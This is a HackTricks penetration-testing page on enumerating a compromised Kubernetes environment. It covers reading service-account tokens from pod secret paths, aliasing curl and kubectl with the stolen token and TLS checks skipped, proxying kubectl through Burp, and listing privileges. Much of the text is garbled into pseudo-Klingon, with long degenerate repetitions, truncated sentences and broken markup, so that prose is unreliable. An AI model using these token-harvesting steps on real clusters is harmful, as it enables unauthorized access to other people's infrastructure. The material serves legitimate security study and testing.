# Kubernetes Enumeration

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!HackTricks AWS Red Team Expert</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Kubernetes Tokens

If you have compromised access to a machine the user may have access to some Kubernetes platform. The token is usually located in a file pointed by the **env var `KUBECONFIG`** or **inside `~/.kube`**.

In this folder you might find config files with **tokens and configurations to connect to the API server**. In this folder you can also find a cache folder with information previously retrieved.

If you have compromised a pod inside a kubernetes environment, there are other places where you can find tokens and information about the current K8 env:

### Service Account Tokens

Before continuing, if you don't know what is a service in Kubernetes I would suggest you to **follow this link and read at least the information about Kubernetes architecture.**

Taken from the Kubernetes [documentation](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server):

_‚ÄúWhen you create a pod, if you do not specify a service account, it is automatically assigned the_ default _service account in the same namespace.‚Äù_

**ServiceAccount** is an object managed by Kubernetes and used to provide an identity for processes that run in a pod.\
Every service account has a secret related to it and this secret contains a bearer token. This is a JSON Web Token (JWT), a method for representing claims securely between two parties.

Usually **one** of the directories:

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

contain the files:

* **ca.crt**: It's the ca certificate to check kubernetes communications
* **namespace**: It indicates the current namespace
* **token**: It contains the **service token** of the current pod.

Now that you have the token, you can find the API server inside the environment variable **`KUBECONFIG`**. For more info run `(env | set) | grep -i "kuber|kube`**`"`**

The service account token is being signed by the key residing in the file **sa.key** and validated by **sa.pub**.

Default location on **Kubernetes**:

* /etc/kubernetes/pki

Default location on **Minikube**:

* /var/lib/localkube/certs

### Hot Pods

_**Hot pods are**_ pods containing a privileged service account token. A privileged service account token is a token that has permission to do privileged tasks such as listing secrets, creating pods, etc.

## RBAC

If you don't know what is **RBAC**, **read this section**.

## Enumeration CheatSheet

In order to enumerate a K8s environment you need a couple of this:

* A **valid authentication token**. In the previous section we saw where to search for a user token and for a service account token.
* The **address (**_**https://host:port**_**) of the Kubernetes API**. This can be usually found in the environment variables and/or in the kube config file.
* **Optional**: The **ca.crt to verify the API server**. This can be found in the same places the token can be found. This is useful to verify the API server certificate, but using `--insecure-skip-tls-verify` with `kubectl` or `-k` with `curl` you won't need this.

With those details you can **enumerate kubernetes**. If the **API** for some reason is **accessible** through the **Internet**, you can just download that info and enumerate the platform from your host.

However, usually the **API server is inside an internal network**, therefore you will need to **create a tunnel** through the compromised machine to access it from your machine, or you can **upload the** [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) binary, or use **`curl/wget/anything`** to perform raw HTTP requests to the API server.

### Differences between `list` and `get` verbs

With **`get`** permissions you can access information of specific assets (_`describe` option in `kubectl`_) API:
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
**`list`** permission-vaD, 'ej API request-lI' 'e' vItlhutlh 'e' vItlhutlh 'e' 'ej type of asset (_`get` option in `kubectl`_) vItlhutlh.
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
**`watch`** permission-vaD, API requestmey patlh execute qachtaHvIS, assets monitor laH.
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
bIqetlh 'ej Deployment manifest qarDaq 'e' vItlhutlhlaHbe'chugh (be'nalvIS 'ej chay' 'e' vItlhutlhlaHbe'chugh).

{% hint style="danger" %}
`kubectl` commands 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaH
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
ghItlhvam, pod vItlhutlh **kube-api server** vIlegh **kubernetes.default.svc** domain name 'ej **`/etc/resolv.config`** vItlhutlh, vaj kubernetes DNS server (range vItlhutlh ".1" vIlegh) vItlhutlh.
{% endhint %}

### kubectl vIlo'

token 'ej vaj API server vItlhutlh vaj kubectl vaj curl vIlo' vItlhutlh:

By default, APISERVER 'ej **`https://`** schema vIlo' vItlhutlh.
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> if no `https://` in url, you may get Error Like Bad Request.

> `https://` pagh url, 'oH 'e' vItlhutlh.

You can find an [**official kubectl cheatsheet here**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/). The goal of the following sections is to present in ordered manner different options to enumerate and understand the new K8s you have obtained access to.

To find the HTTP request that `kubectl` sends you can use the parameter `-v=8`

#### MitM kubectl - Proxyfying kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### QaD jImej

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

**QaHvaj** vItlhutlhlaHbe'chugh **ngogh** credentials **ghItlh** **configure** **ghaH** **loS** **ghItlh** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **gh
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### tlhegh 'ej tlheghvam

DaH jImej nIvbogh vItlhutlh

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
{% endtab %}
{% endtabs %}

### Get Current Privileges

{% tabs %}
{% tab title="kubectl" %}

To get information about the current privileges of the user, you can use the following command:

```bash
kubectl auth can-i <verb> <resource> --as <user>
```

Replace `<verb>` with the desired action (e.g., `get`, `create`, `delete`), `<resource>` with the target resource (e.g., `pods`, `deployments`), and `<user>` with the user you want to check.

For example, to check if the current user can create pods, you can run:

```bash
kubectl auth can-i create pods
```

This will return either `yes` or `no` depending on the user's privileges.

{% endtab %}
{% endtabs %}

### Get Cluster Roles and Role Bindings

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

**Qapla'!** yIbuS **rakkess** tool: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

**Kubernetes RBAC** **rIn** **ghu'vam** **chel**:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**vaj** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** 